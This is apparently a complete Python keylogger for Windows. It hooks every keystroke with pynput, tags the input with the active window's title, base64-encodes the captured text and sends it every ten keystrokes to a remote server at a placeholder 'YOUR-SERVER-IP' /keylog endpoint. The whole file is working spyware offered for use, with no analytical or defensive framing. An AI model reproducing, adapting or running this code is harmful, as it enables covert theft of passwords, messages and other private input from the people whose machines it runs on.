from pynput.keyboard import Listener
import requests
import base64
from win32gui import GetWindowText, GetForegroundWindow

def encode_b64(message):
    message_bytes = message.encode("utf-8")
    base64_bytes = base64.urlsafe_b64encode(message_bytes)
    return base64_bytes.decode("utf-8")

def on_press(key):
    try:    
        server_ip = "YOUR-SERVER-IP"
        global counter
        global message
        global window

        current_window = str(GetWindowText(GetForegroundWindow()))
        if window != current_window:
            window = current_window
            message += f"\n\n==>{window}\n"

        if(str(key) == 'Key.enter'):
            key = '\n'

        if(str(key) != "\"'\""):
            key = str(key).replace("'", "")
        else:
            key = str(key).replace('"', '')
        
        print(key)

        message += str(key)
        counter += 1

        #send request every 10 keystrokes
        if counter == 10:
            counter = 0
            message_b64 = encode_b64(message)
            r = requests.get(f'http://{server_ip}/keylog?data={message_b64}')
            
            if r.status_code == 200:
                message = ''

    except Exception as err:
        print(err)

print('Keylogger ON!')
counter = 0
message = ''
window = ''

with Listener(on_press=on_press) as listener:
    listener.join()
